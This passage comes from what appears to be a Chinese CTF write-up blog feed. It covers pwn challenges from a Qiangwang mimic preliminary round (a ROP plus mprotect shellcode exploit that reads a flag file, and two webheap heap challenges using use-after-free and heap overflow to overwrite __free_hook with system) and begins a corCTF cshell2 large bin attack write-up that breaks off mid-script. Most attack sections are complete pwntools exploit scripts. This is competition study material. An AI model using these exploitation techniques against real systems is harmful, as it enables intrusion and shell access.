class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>rdi=<span class="hljs-number">0x0000000000023b72</span><br>rsi=<span class="hljs-number">0x000000000002604f</span><br>rdx=<span class="hljs-number">0x0000000000119241</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">mode=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">global</span> p,e,libc<br>    <span class="hljs-keyword">if</span> (mode):<br>        p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;127.0.0.1:4444&#x27;</span>)<br>    e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>    libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>,checksec=<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">att</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>libc=<span class="hljs-string">&quot;&quot;</span><br>e=<span class="hljs-string">&quot;&quot;</span><br>p=<span class="hljs-string">&quot;&quot;</span><br>check()<br>context.binary=e<br>payload=<span class="hljs-string">b&#x27;&gt;&#x27;</span>*<span class="hljs-number">536</span>+<span class="hljs-string">b&#x27;.&gt;&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;&gt;&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;&gt;&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;.&gt;&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;&lt;&#x27;</span>*<span class="hljs-number">40</span>+<span class="hljs-string">&#x27;,&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;\n&quot;</span>,payload)<br>e.address=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x1955</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br>d=u64(p.read(<span class="hljs-number">8</span>))-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>libc.address=d&amp;<span class="hljs-number">0xfffffffffffff000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>p.send(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    控制返回地址到读取用户输入的位置</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>rdi=libc.address+rdi<br>rsi=libc.address+rsi<br>rdx=libc.address+rdx<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>bss=e.bss(<span class="hljs-number">0x100</span>)<br><br>r=flat([rdi,<span class="hljs-number">0</span>,rsi,bss,rdx,<span class="hljs-number">0x200</span>,<span class="hljs-number">1</span>,read,rdi,bss&amp;<span class="hljs-number">0xfffffffffffff000</span>,rsi,<span class="hljs-number">0x1000</span>,rdx,<span class="hljs-number">0x7</span>,<span class="hljs-number">1</span>,mprotect,bss])<br>payload=<span class="hljs-string">b&#x27;&gt;&#x27;</span>*<span class="hljs-number">536</span>+<span class="hljs-string">&#x27;,&gt;&#x27;</span>*<span class="hljs-built_in">len</span>(r)<br>p.sendline(payload)<br>p.send(r)<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)+shellcraft.dup2(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)+shellcraft.read(<span class="hljs-number">0</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x40</span>)+shellcraft.write(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x40</span>)<br>p.sendline(asm(shellcode))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="webheap">webheap</h2><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-1.jpg" srcset="/img/loading.gif" lazyload alt="run_packet函数代码" title="run_packet函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-2.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-4.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap-5.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p>主要难点在于分析<code>parse_packet</code>函数比较麻烦，通过<code>delete</code>函数可以发现，程序存在<code>uaf</code>漏洞，那么剩下的就简单了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_head</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\xb9\x05&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_mode</span>(<span class="hljs-params">mode</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x84&quot;</span>+p8(mode)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_index</span>(<span class="hljs-params">ind</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x80&quot;</span>+p8(ind)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_size</span>(<span class="hljs-params">size=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x81&quot;</span>+p16(size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_data</span>(<span class="hljs-params">data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\xbd\x81&quot;</span>+p16(<span class="hljs-built_in">len</span>(data))+data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_end</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x80\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">payload</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;length: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">0</span>)+\<br>            make_index(ind)+\<br>            make_size(size)+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">1</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">2</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">3</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data(data)+\<br>            make_end()<br>    send(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">att</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>p=process(<span class="hljs-string">&#x27;./webheap&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x430</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,p64(free_hook))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="webheap-revenge">webheap_revenge</h2><p>程序主要逻辑与<code>webheap</code>相同，所以交互的脚本不需要重新写，直接拿<code>webheap</code>的就好了</p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap_regenve.jpg" srcset="/img/loading.gif" lazyload alt="构造chunk代码" title="构造chunk代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap_regenve-1.jpg" srcset="/img/loading.gif" lazyload alt="查看chunk代码" title="查看chunk代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap_regenve-2.jpg" srcset="/img/loading.gif" lazyload alt="释放chunk代码" title="释放chunk代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E6%8C%91%E6%88%98%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-webheap_regenve-3.jpg" srcset="/img/loading.gif" lazyload alt="编辑chunk代码" title="编辑chunk代码"></p><p>分析程序发现，在执行<code>edit功能</code>时，向<code>chunk</code>中写入的数据长度为用户输入的数据长度，而且程序没有对输入数据长度进行限制，所以我们可以随心所欲的向程序发送任意长度的数据，就是说程序存在<code>堆溢出</code>漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_head</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\xb9\x05&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_mode</span>(<span class="hljs-params">mode</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x84&quot;</span>+p8(mode)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_index</span>(<span class="hljs-params">ind</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x80&quot;</span>+p8(ind)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_size</span>(<span class="hljs-params">size=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x81&quot;</span>+p16(size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_data</span>(<span class="hljs-params">data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\xbd\x81&quot;</span>+p16(<span class="hljs-built_in">len</span>(data))+data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_end</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x80\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">payload</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;length: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">0</span>)+\<br>            make_index(ind)+\<br>            make_size(size)+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">1</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">2</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">3</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data(data)+\<br>            make_end()<br>    send(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">att</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>p=process(<span class="hljs-string">&#x27;./webheap_revenge&#x27;</span>)<br>gdb.attach(p)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x430</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x38</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x430</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(<span class="hljs-number">0x41</span>)+p64(free_hook))<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x38</span>)<br>edit(<span class="hljs-number">4</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022 corctf-pwn</title>
    <link href="/page/wp/corctf-pwn/"/>
    <url>/page/wp/corctf-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="cshell2">cshell2</h2><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-1.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-2.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-3.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-4.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-5.jpg" srcset="/img/loading.gif" lazyload alt="change_age函数代码" title="change_age函数代码"></p><p>在<code>create</code>,<code>show</code>,<code>delete</code>,<code>edit</code>函数中都检测了<code>chunk</code>数组中对应的<code>chunk</code>的<code>size</code>是否为<code>0</code>，这表示在正常情况下，如果<code>chunk</code>被释放了之后，就无法使用<code>show</code>,<code>delete</code>,<code>edit</code>函数，对那个<code>chunk</code>进行操作，但<code>change_age</code>函数可以修改被释放的<code>chunk</code>的<code>bk_nextsize</code>字段<br><code>create</code>只允许创建大于等于<code>0x408</code>大小的<code>chunk</code>，也就是说只能创建能放入<code>large bin</code>中的<code>chunk</code>，但其中<code>0x410</code>大小的<code>chunk</code>，会优先放入<code>tcache bin</code>中</p><p>所以这题有两个思路</p><ul><li>利用large bin attack修改IO结构体的vtable字段，使程序在进行io操作时执行后门指令</li><li>利用large bin attack修改heap_array中某个成员的size，如果这个成员恰好在tcache bin中，那么就可以修改tcache bin的结构，达到任意地址读写</li></ul><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-6.jpg" srcset="/img/loading.gif" lazyload alt=""></p><blockquote><p>使用one_gadget获取地址报错，所以第一种方法暂时无法利用</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;第二种方法</span><br><span class="hljs-string"> 将got表中的地址放入tcache bin中，修改got表中free项地址为system</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span 